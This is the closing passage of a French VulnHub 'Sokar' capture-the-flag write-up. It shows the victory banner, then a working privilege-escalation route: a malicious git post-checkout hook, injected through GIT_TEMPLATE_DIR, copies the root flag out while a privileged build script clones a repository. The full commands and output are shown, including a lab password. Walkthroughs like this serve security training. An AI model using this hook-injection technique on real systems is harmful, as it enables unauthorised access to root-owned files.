|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
```

L'autre solution sans doute plus propre et de définir un hook Git qui concerne la commande clone, en particulier *post-checkout*.  

Comme on n'a pas d'accès pour écrire directement dans les hooks on fait une copie du dossier et on spécifie le chemin en environnement :  

```plain
[apophis@sokar ~]$ cp -r /usr/share/git-core/templates/ mytemplates
[apophis@sokar ~]$ cd mytemplates/hooks
[apophis@sokar hooks]$ echo '#!/bin/bash' > post-checkout
[apophis@sokar hooks]$ echo 'cp /root/flag /tmp/flag2' >> post-checkout
[apophis@sokar hooks]$ echo 'chown apophis.apophis /tmp/flag2' >> post-checkout
[apophis@sokar hooks]$ chmod +x post-checkout
[apophis@sokar hooks]$ cd ../..
[apophis@sokar ~]$ GIT_TEMPLATE_DIR=/home/apophis/mytemplates/ ./build
Build? (Y/N) Y
Y
Cloning into '/mnt/secret-project'...
Password: p4ssw0rd

remote: Counting objects: 4, done.        
remote: Compressing objects: 100% (4/4), done.        
remote: Total 4 (delta 0), reused 0 (delta 0)        s     
Receiving objects: 100% (4/4), 1.13 MiB | 350.00 KiB/s, done.
Checking connectivity... done.
[apophis@sokar ~]$ ls -l /tmp/flag2
-rw-r--r-- 1 apophis apophis 837 Mar 10 21:18 /tmp/flag2
```

Victory ! Conclusion de tout ça : l'IPv6 ça a du bon :p

*Published March 13 2015 at 18:03*